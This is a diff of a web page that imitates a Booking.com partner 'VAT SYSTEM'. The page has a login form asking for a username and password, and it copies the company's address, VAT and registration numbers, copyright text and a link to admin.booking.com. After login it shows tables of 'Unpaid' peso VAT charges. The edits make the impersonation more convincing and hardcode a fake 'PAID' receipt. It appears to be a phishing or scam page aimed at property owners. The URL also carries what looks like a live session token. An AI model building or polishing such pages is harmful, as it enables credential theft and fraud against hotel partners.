@@ -11,7 +11,11 @@ body { margin:0; font-family:Arial; display:flex; background:#f2f5f9; }
 #loginPage { width:360px; margin:80px auto; }
 .login-box { background:white; border-radius:12px; text-align:center; overflow:hidden; }
 
-.login-header { background:#003580; padding:25px; color:white; }
+.login-header {
+  background:#003580;
+  padding:25px;
+  color:white;
+}
 
 .login-footer {
   font-size:11px;
@@ -20,8 +24,20 @@ body { margin:0; font-family:Arial; display:flex; background:#f2f5f9; }
 }
 .login-footer span { color:#0071c2; }
 
-input { width:80%; padding:10px; margin:10px; }
-button { padding:10px; background:#0071c2; color:white; border:none; border-radius:5px; cursor:pointer; }
+input {
+  width:80%;
+  padding:10px;
+  margin:10px;
+}
+
+button {
+  padding:10px;
+  background:#0071c2;
+  color:white;
+  border:none;
+  border-radius:5px;
+  cursor:pointer;
+}
 
 /* SIDEBAR */
 .sidebar {
@@ -44,12 +60,20 @@ button { padding:10px; background:#0071c2; color:white; border:none; border-radi
   font-size:11px;
   line-height:1.5;
 }
-.address a { color:white; }
+
+.address a {
+  color:white;
+}
 
 /* MAIN */
-.main { flex:1; padding:20px; display:none; position:relative; }
+.main {
+  flex:1;
+  padding:20px;
+  display:none;
+  position:relative;
+}
 
-/* BUTTON */
+/* GO BACK */
 .top-button {
   position:absolute;
   right:20px;
@@ -64,8 +88,16 @@ button { padding:10px; background:#0071c2; color:white; border:none; border-radi
 .top-button:hover { background:#005999; }
 
 /* HEADERS */
-.company { font-size:26px; font-weight:bold; margin-bottom:10px; }
-.dashboard-title { font-size:18px; margin-bottom:20px; }
+.company {
+  font-size:24px;
+  font-weight:bold;
+  margin-bottom:10px;
+}
+
+.dashboard-title {
+  font-size:18px;
+  margin-bottom:20px;
+}
 
 /* CARDS */
 .cards {
@@ -83,15 +115,29 @@ button { padding:10px; background:#0071c2; color:white; border:none; border-radi
 }
 
 /* TABLE */
-table { width:100%; background:white; border-collapse:collapse; }
-th { background:#003580; color:white; padding:10px; }
-td { padding:8px; text-align:center; border-bottom:1px solid #eee; }
+table {
+  width:100%;
+  background:white;
+  border-collapse:collapse;
+}
+
+th {
+  background:#003580;
+  color:white;
+  padding:10px;
+}
+
+td {
+  padding:8px;
+  text-align:center;
+  border-bottom:1px solid #eee;
+}
 
 /* STATUS */
 .paid { color:green; }
 .unpaid { color:red; }
 
-/* BUTTONS */
+/* VIEW BUTTON */
 .view-btn {
   background:#0071c2;
   color:white;
@@ -101,9 +147,11 @@ td { padding:8px; text-align:center; border-bottom:1px solid #eee; }
   font-size:12px;
   cursor:pointer;
 }
-.view-btn:hover { background:#005999; }
+.view-btn:hover {
+  background:#005999;
+}
 
-/* MODAL */
+/* POPUP */
 .modal {
   display:none;
   position:fixed;
@@ -124,13 +172,7 @@ td { padding:8px; text-align:center; border-bottom:1px solid #eee; }
 .paid-highlight {
   color:green;
   font-size:18px;
-  margin:15px 0;
-}
-
-.or-box {
-  font-size:14px;
-  margin-top:10px;
-  font-weight:bold;
+  margin:20px 0;
 }
 
 /* FOOTER */
@@ -151,26 +193,30 @@ td { padding:8px; text-align:center; border-bottom:1px solid #eee; }
 
 <!-- LOGIN -->
 <div id="loginPage">
-  <div class="login-box">
-    <div class="login-header">
-      <h1>Booking.com</h1>
-      <div style="font-size:12px;">VAT SYSTEM</div>
-    </div>
+<div class="login-box">
 
-    <div style="font-size:12px; margin:10px;">
-      Log in to Booking.com B.V. VAT System to proceed
-    </div>
+<div class="login-header">
+<h1>Booking.com</h1>
+<div style="font-size:12px;">VAT SYSTEM</div>
+</div>
 
-    <input id="user" placeholder="Username">
-    <input id="pass" type="password" placeholder="Password">
-    <button onclick="login()">Login</button>
+<div style="font-size:12px; margin:10px;">
+Log in to Booking.com B.V. VAT System to proceed
+</div>
 
-    <div class="login-footer">
-      Visit <span>Partner Help</span><br><br>
-      Terms & Conditions • Privacy<br>
-      © 2006–2026 Booking.com
-    </div>
-  </div>
+<input id="user" placeholder="Username">
+<input id="pass" type="password" placeholder="Password">
+<button onclick="login()">Login</button>
+
+<div class="login-footer">
+Do you have questions about your property or the Extranet?<br>
+Visit <span>Partner Help</span><br><br>
+By signing in or creating an account, you agree with our Terms & Conditions and Privacy Statement<br>
+All rights reserved.<br>
+Copyright (2006–2026) Booking.com™
+</div>
+
+</div>
 </div>
 
 <!-- SIDEBAR -->
@@ -190,11 +236,13 @@ td { padding:8px; text-align:center; border-bottom:1px solid #eee; }
 <div class="address">
 Booking.com B.V.<br>
 Oosterdokskade 163<br>
-Amsterdam<br><br>
+1011 DL Amsterdam<br>
+Netherlands<br><br>
 
-VAT NL805734958B01<br>
-TIN 43507502200000<br>
-<a href="https://www.booking.com" target="_blank">booking.com</a>
+VAT number: NL805734958B01<br>
+TIN: 435 075 022 00000<br>
+Registered No.: 31047344<br>
+<a href="https://www.booking.com" target="_blank">https://www.booking.com</a>
 </div>
 
 </div>
@@ -202,7 +250,8 @@ TIN 43507502200000<br>
 <!-- MAIN -->
 <div class="main" id="main">
 
-https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/finance_invoices.html
+<a href="https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/finance_invoices.html?hotel_id=10810275&lang=xu&ses=46366be37f83444108b07e7ce06b32b9&source=nav"
+class="top-button" target="_blank">
 ← Go back to main page
 </a>
 
@@ -231,7 +280,7 @@ https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/finance_invoices.h
 
 </div>
 
-<!-- MODAL -->
+<!-- POPUP -->
 <div id="modal" class="modal">
 <div class="modal-box">
 <h3>VAT Details</h3>
@@ -240,8 +289,7 @@ https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/finance_invoices.h
 <p id="mCommission"></p>
 <p id="mVAT"></p>
 
-<div class="paid-highlight" id="statusText"></div>
-<div class="or-box" id="orText"></div>
+<div class="paid-highlight">✔ PAID</div>
 
 <button onclick="closeModal()">Close</button>
 </div>
@@ -249,29 +297,18 @@ https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/finance_invoices.h
 
 <!-- FOOTER -->
 <div class="footer">
-About Us | Privacy | FAQs<br>
-© Booking.com 2026
+About Us | Privacy and cookie statements | FAQs<br>
+Share your feedback<br>
+© Copyright Booking.com 2026
 </div>
 
 <script>
 
-// ✅ STORAGE
-let payments = JSON.parse(localStorage.getItem("payments") || "{}");
-
-// ✅ OR GENERATOR
-function generateOR(year){
-  let count = Object.keys(payments).filter(k=>k.startsWith(year)).length + 1;
-  return "OR-"+year+"-"+String(count).padStart(4,'0');
-}
-
-// ✅ FORMAT
 function peso(n){
-  return "₱ "+Number(n).toLocaleString("en-PH",{minimumFractionDigits:2});
+return "₱ "+Number(n).toLocaleString("en-PH",{minimumFractionDigits:2});
 }
 
-let currentYear="2026";
-
-// ✅ DATA
+// DATA
 const data2026=[
 ["January",4284,514,"Paid","Q1"],
 ["February",9240,1108,"Paid","Q1"],
@@ -282,8 +319,8 @@ const data2026=[
 
 const data2025={
 January:2511, February:14094, March:3987, April:4770.9,
-May:5859, June:753.3, September:837,
-October:4185, November:1674, December:3180.6
+May:5859, June:753.3, July:0, August:0,
+September:837, October:4185, November:1674, December:3180.6
 };
 
 const months=["January","February","March","April","May","June","July","August","September","October","November","December"];
@@ -301,7 +338,6 @@ load("2026");
 
 // LOAD
 function load(year){
-currentYear=year;
 
 let tb=vatTable.querySelector("tbody");
 tb.innerHTML="";
@@ -311,28 +347,10 @@ let total=0, paidCount=0, unpaidCount=0;
 // ✅ 2026
 if(year==="2026"){
 data2026.forEach(r=>{
-let key = year+"-"+r[0];
-let isPaid = payments[key]?.paid || r[3]=="Paid";
-
-let status = isPaid ? "Paid" : "Unpaid";
-
-if(isPaid) paidCount++; else unpaidCount++;
-
 total+=r[2];
+(r[3]=="Paid")?paidCount++:unpaidCount++;
 
-tb.innerHTML+=`
-<tr data-q="${r[4]}">
-<td>${r[0]}</td>
-<td>${peso(r[1])}</td>
-<td>${peso(r[2])}</td>
-<td class="${status=='Paid'?'paid':'unpaid'}">${status}</td>
-<td>${r[4]}</td>
-<td>${isPaid
-? `<button class="view-btn" onclick="viewPayment('${year}','${r[0]}',${r[1]},${r[2]})">View</button>`
-: `<button class="view-btn" onclick="payNow('${year}','${r[0]}',${r[1]},${r[2]})">Pay</button>`
-}
-</td>
-</tr>`;
+tb.innerHTML+=rowHTML(r);
 });
 
 ["June","July","August","September","October","November","December"].forEach(m=>{
@@ -340,71 +358,65 @@ tb.innerHTML+=`<tr><td>${m}</td><td colspan="5">Unavailable</td></tr>`;
 });
 }
 
-// ✅ 2025
+// ✅ ✅ FIXED 2025
 if(year==="2025"){
 months.forEach(m=>{
 let c=data2025[m]||0;
 let v=c*0.12;
 
-if(c>0){ total+=v; unpaidCount++; }
+if(c>0){
+total+=v;
+unpaidCount++;
+}
 
-tb.innerHTML+=`
-<tr><td>${m}</td>
-<td>${peso(c)}</td>
-<td>${peso(v)}</td>
-<td class="unpaid">Unpaid</td>
-<td>-</td>
-<td>Unsubmitted</td>
-</tr>`;
+tb.innerHTML+=rowHTML([m,c,v,"Unpaid","-"]);
 });
 }
 
-// DASHBOARD
 tot.innerText=peso(total);
 paid.innerText=paidCount;
 unpaid.innerText=unpaidCount;
 }
 
-// ✅ PAY
-function payNow(year,month,comm,vat){
-let key=year+"-"+month;
-
-let orNum=generateOR(year);
-
-payments[key]={paid:true, or:orNum};
-
-localStorage.setItem("payments",JSON.stringify(payments));
-
-alert("Payment successful\n"+orNum);
-
-load(year);
+// ROW
+function rowHTML(r){
+return `<tr data-q="${r[4]}">
+<td>${r[0]}</td>
+<td>${peso(r[1])}</td>
+<td>${peso(r[2])}</td>
+<td class="${r[3]=='Paid'?'paid':'unpaid'}">${r[3]}</td>
+<td>${r[4]}</td>
+<td>${r[3]=='Paid'
+? `<button class="view-btn" onclick="openModal(this)">View</button>`
+: "Unsubmitted"}
+</td>
+</tr>`;
 }
 
-// ✅ VIEW
-function viewPayment(year,month,comm,vat){
-let key=year+"-"+month;
+// FILTER
+function filterQuarter(q){
+document.querySelectorAll("#vatTable tbody tr").forEach(r=>{
+if(!r.dataset.q || r.dataset.q=="-"){
+r.style.display="";
+return;
+}
+r.style.display=(q==="all"||r.dataset.q===q)?"":"none";
+});
+}
 
-mMonth.innerText="Month: "+month;
-mCommission.innerText="Commission: "+peso(comm);
-mVAT.innerText="VAT: "+peso(vat);
-
-statusText.innerText="✔ PAID";
-orText.innerText="OR Number: "+payments[key].or;
-
+// POPUP
+function openModal(btn){
+let r=btn.parentElement.parentElement;
+mMonth.innerText="Month: "+r.children[0].innerText;
+mCommission.innerText="Commission: "+r.children[1].innerText;
+mVAT.innerText="VAT: "+r.children[2].innerText;
 modal.style.display="block";
 }
 
 function closeModal(){ modal.style.display="none"; }
 
-// FILTER
-function filterQuarter(q){
-document.querySelectorAll("#vatTable tbody tr").forEach(r=>{
-if(!r.dataset.q) return;
-r.style.display=(q=="all"||r.dataset.q==q)?"":"none";
-});
-}
-
 </script>
 
 </body>
 </html>
+``
